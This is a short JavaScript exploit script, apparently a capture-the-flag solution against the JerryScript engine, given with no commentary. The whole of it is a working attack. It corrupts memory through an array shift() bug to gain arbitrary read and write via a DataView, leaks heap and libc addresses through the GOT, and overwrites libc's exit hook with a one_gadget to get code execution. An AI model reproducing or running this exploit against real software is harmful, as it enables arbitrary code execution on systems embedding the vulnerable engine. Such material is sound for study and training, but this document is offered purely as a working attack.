let a = ["11111111"]
a.shift()
ab = new ArrayBuffer(0x1000)
dv = new DataView(ab)
dv.setUint32(0, 0x41414141, true)

heap_base_offset = 0xa7
jerry_global_heap = [1, 2]
jerry_global_heap[0] = a[24] - heap_base_offset
free_got = jerry_global_heap[0]*0x10 - 0x1490
libc_addr = [1, 2]
exit_hook = [1, 2]
one_gadget = [1, 2]

a[24] = jerry_global_heap[0] + 0x2e
jerry_global_heap[1] = dv.getUint32(0x5c, true)
jerry_global_heap[0] = jerry_global_heap[0]*0x10
print("jerry_global_heap: 0x"+(jerry_global_heap[0]+jerry_global_heap[1]*0x100000000).toString(16))

dv.setUint32(0x58, free_got, true)
libc_addr[0] = dv.getUint32(0x8, true) - 0x9d850
libc_addr[1] = dv.getUint32(0xc, true)
print("libc_addr: 0x"+(libc_addr[0]+libc_addr[1]*0x100000000).toString(16))

exit_hook[0] = 0x23ff60 + libc_addr[0]
exit_hook[1] = libc_addr[1]
print("exit_hook: 0x"+(exit_hook[0]+exit_hook[1]*0x100000000).toString(16))	

one_gadget[0] = 0xe6c7e + libc_addr[0]
one_gadget[1] = libc_addr[1]
print("one_gadget: 0x"+(one_gadget[0]+one_gadget[1]*0x100000000).toString(16))	

a[24] = a[24] + 0x177
exit_hook = exit_hook[0]+exit_hook[1]*0x100000000
dv.setBigUint64(0x58, exit_hook, true)

one_gadget = one_gadget[0]+one_gadget[1]*0x100000000
dv.setBigUint64(0x8, one_gadget, true)
dv.setBigUint64(0x10, one_gadget, true)
ab = new ArrayBuffer(0x1000)
// a.shift()